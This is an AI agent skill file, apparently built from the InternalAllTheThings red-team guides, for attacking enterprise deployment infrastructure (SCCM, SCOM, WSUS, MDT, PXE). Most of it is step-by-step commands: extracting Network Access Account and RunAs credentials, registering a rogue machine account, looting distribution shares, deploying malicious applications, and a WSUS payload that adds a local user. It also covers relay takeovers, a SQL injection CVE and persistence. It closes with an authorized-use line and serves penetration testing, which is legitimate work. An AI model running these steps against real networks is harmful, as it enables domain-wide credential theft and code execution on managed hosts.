---
name: active-directory-enterprise-systems
description: >-
  Compromise enterprise management and deployment infrastructure in Windows environments:
  SCCM/MECM (site takeover, network access accounts, PXE, client push), SCOM, WSUS and MDT, plus
  PXE boot image extraction. Use when you find SCCM, SCOM, WSUS or MDT in an internal network,
  when reviewing deployment credentials or task sequences, or when pivoting from a workstation to
  the systems that distribute privileged software and scripts.
license: Upstream terms apply - see NOTICE.md
metadata:
  source: https://github.com/swisskyrepo/InternalAllTheThings
  source-commit: "203bb0c"
  reference-files: "5"
  generated-by: build/build.py
---

# Enterprise Management Systems (SCCM, SCOM, WSUS, MDT)

Deployment and monitoring infrastructure is a privilege multiplier: SCCM distributes software with
SYSTEM rights to every managed host, SCOM stores RunAs credentials for privileged accounts, WSUS
installs updates as SYSTEM, and MDT shares contain the passwords used to join machines to the
domain. You rarely need to escalate inside these systems — you need one credential they already
hold. Done means a credential or a deployment primitive that gives execution on hosts you do not
control.

## When to use this skill

- `sccmhunter`, BloodHound (ConfigManBearPig/sccmhound) or LDAP enumeration shows Configuration
  Manager in the domain.
- You have local admin on an SCCM client and want the Network Access Account.
- You found `DeploymentShare$`, `SCCMContentLib$`, `SYSVOL` deployment scripts, or a PXE-enabled
  distribution point.
- SCOM, WSUS or MDT is installed and you want the credentials or the deployment channel.
- You need a durable, legitimate-looking execution mechanism rather than a C2.

For hash/credential handling of what you recover, see `active-directory-credentials`. For relay
chains into the site database, see `active-directory-lateral-movement`. Read
`active-directory-enumeration` for locating these servers via BloodHound in the first place.

## First moves

1. **Locate the hierarchy before attacking it.** Client → management point → site server → site
   database is the chain; each hop has different rights:

   ```bash
   sccmhunter.py find -u user -p P@ssw0rd -dc-ip 10.10.10.10 -d lab.lan
   sccmhunter.py show -siteservers
   ```

   ```powershell
   MalSCCM.exe locate          # run on a compromised client
   MalSCCM.exe inspect /all    # run on a site server
   ```

2. **Pull the Network Access Account from a client you administer.** NAA is a domain account SCCM
   keeps for OS deployment and it is often over-privileged:

   ```powershell
   .\SharpSCCM.exe local secrets -m wmi      # DPAPI blobs from CCM_NetworkAccessAccount
   .\SharpSCCM.exe local secrets -m disk     # legacy secrets in OBJECTS.DATA
   ```

3. **Or request the NAA policy as a machine you control**, when PKI client auth is not enforced:

   ```powershell
   addcomputer.py -computer-name 'attacker$' -computer-pass P@ssw0rd -dc-ip 10.10.10.10 lab.lan/user:'P@ssw0rd'
   SharpSCCM.exe get naa -r newdevice -u attacker$ -p P@ssw0rd
   ```

4. **Loot the distribution point shares.** `SCCMContentLib$` is world-readable and holds packages,
   scripts and sometimes credentials:

   ```powershell
   Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
   Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
   ```

5. **Turn site-server access into execution on a target group** — create a group, deploy a
   malicious application, force check-in:

   ```powershell
   .\SharpSCCM.exe exec -d WS01 -p "C:\Windows\System32\ping 10.10.10.10" -s --debug
   MalSCCM.exe app /create /name:demoapp /uncpath:"\\BLORE-SCCM\SCCMContentLib$\localthread.exe"
   MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL
   MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment
   MalSCCM.exe checkin /groupname:TargetGroup
   ```

6. **SCOM: decrypt the RunAs credentials** — they are the accounts SCOM uses to manage servers:

   ```powershell
   .\SCOMDecrypt.exe
   .\SharpSCOM.exe DecryptRunAs
   ```

7. **WSUS and MDT: the deployment channel and its plaintext passwords.** WSUS payloads must be a
   Microsoft-signed binary on local disk; MDT shares carry join credentials in cleartext:

   ```powershell
   SharpWSUS.exe locate
   SharpWSUS.exe create /payload:"C:\Users\ben\Documents\pk\psexec.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add\"" /title:"WSUSDemo"
   SharpWSUS.exe approve /updateid:<guid> /computername:bloredc2.blorebank.local /groupname:"Demo Group"
   ```

   ```powershell
   # DeploymentShare\Control\Bootstrap.ini and CustomSettings.ini
   # DomainAdmin / DomainAdminPassword / UserID / UserPassword / DBID / DBPwd
   ```

## Reference map

| Reference | Read it when | Key content |
|---|---|---|
| [sccm.md](references/sccm.md) | Configuration Manager is present — nearly every branch starts here | application deployment via MalSCCM/SharpSCCM, site enumeration and shares (CMLoot, SCCMSecrets), CRED-1..CRED-5 credential paths (PXE, NAA policy, DPAPI blobs, SC_UserAccount), CVE-2024-43468 unauthenticated SQLi, TAKEOVER1/2 and client-push relay, CcmExec persistence |
| [scom.md](references/scom.md) | System Center Operations Manager exists | RunAs credential recovery from the management database, registry, policy file, or by auto-enrolling a new agent; SCOMDecrypt/SharpSCOM |
| [wsus.md](references/wsus.md) | the host updates through WSUS and you have server access | `SharpWSUS locate/inspect/create/approve/check/delete`, signed-binary constraint |
| [mdt.md](references/mdt.md) | a `DeploymentShare$` or MDT server is reachable | Bootstrap.ini/CustomSettings.ini credential names (DomainAdmin, UserID, DBID, SafeModeAdminPassword), task sequence and Scripts folder, LiteTouch WIM/ISO |
| [pxe-boot-image.md](references/pxe-boot-image.md) | PXE boot is available or you have physical/console access | F8 during boot and SHIFT+F10 during setup consoles, PowerPXE `Get-PXEcreds`, WIM extraction for bootstrap.ini passwords |

## Workflow

1. **Identify which system you are facing.** SCCM has a management point and `SCCMContentLib$`;
   SCOM has `HealthService`; WSUS answers on 8530/8531; MDT exposes `DeploymentShare$` and
   `LiteTouchPE_*.wim`. The next step differs completely per system.
2. **SCCM branch — pick by the access you already have:**
   - Local admin on a client → CRED-3/CRED-4 (DPAPI blobs in WMI or OBJECTS.DATA).
   - Any domain account, no PKI client auth → CRED-2: create a machine account and request the NAA
     policy, then deobfuscate it.
   - Site server admin → deploy an application to a target group (lateral movement), or use the
     client-push/relay paths.
   - Site database access → CRED-5 (`SC_UserAccount` plus the site server's private key), CVE-2024-43468
     if unauthenticated.
3. **Relay branch.** TAKEOVER1 relays to MSSQL to grant yourself an SCCM admin role;
   TAKEOVER2 relays the site server's computer account (Microsoft requires it to be a database
   administrator). Both need a coercion primitive from `active-directory-lateral-movement`.
4. **SCOM branch.** Enumerate the management group, then decrypt RunAs credentials from the
   database, the registry, the agent policy file, or by enrolling a fake agent.
5. **WSUS/MDT/PXE branch.** WSUS gives SYSTEM-level update deployment; MDT shares and PXE images
   give domain-join credentials; PXE boot itself gives a console.
6. **Persist if the engagement calls for it** — CcmExec (`SCNotification.exe.config`) survives on
   every managed client — then consolidate credentials via `active-directory-credentials`.

## Gotchas

- The SCCM NAA is *not* a single readable attribute: on modern clients it is a DPAPI blob needing
  local admin (CRED-3), while legacy secrets live in the WMI repository
  `OBJECTS.DATA` (CRED-4). Requesting the policy remotely (CRED-2) only works when PKI client
  authentication is **not** required.
- CRED-5 requires two things at once: site database access *and* access to the site server's
  private key. Database access alone yields encrypted blobs you cannot read.
- TAKEOVER1 needs the database hosted separately from the site server with the site server as
  `sysadmin`; TAKEOVER2 relies on Microsoft's own requirement that the site server computer account
  is a database administrator. Neither works if those conditions are absent.
- The client-push relay path needs **three** settings simultaneously: automatic site-wide client
  push, automatic site device approval, and fallback authentication to NTLM.
- WSUS payloads must be **Microsoft-signed binaries** and must reference a path on the WSUS
  server's disk. An unsigned payload is simply not deployed — the failure looks like a normal
  update failure.
- MDT `Bootstrap.ini`/`CustomSettings.ini` are plaintext and shared; `DomainAdmin`* is a
  domain-join account, `SafeModeAdminPassword` is a DSRM password, and `DBID`/`DBPwd` are SQL
  credentials. Check `Scripts\`, `Applications\` and the LiteTouch WIM/ISO for more.
- PXE: `F8` during boot gives an admin console; `SHIFT+F10` during Windows setup gives a system
  console where you can add a local admin or dump SAM/SYSTEM. `PowerPXE.ps1` extracts the WIM to
  read `bootstrap.ini` without booting.
- MalSCCM deployments consume real SCCM state (`app /create`, `/deploy`, group membership). Use
  `/cleanup` and `group /delete` afterwards, as the reference explicitly does.
- CVE-2024-43468 only affects Configuration Manager 2403 and earlier; the SQLi lets you create a
  sysadmin login unauthenticated, so check the version before spending time on credential paths.

## Authorized use

For authorized engagements only, with explicit permission and within the agreed scope.
Deployment infrastructure is production-critical: an approved WSUS update or SCCM application can
reach every managed host at once. Stage narrowly, use test groups, and clean up.

## Source

Converted from the upstream InternalAllTheThings guides
(https://github.com/swisskyrepo/InternalAllTheThings), see NOTICE.md.
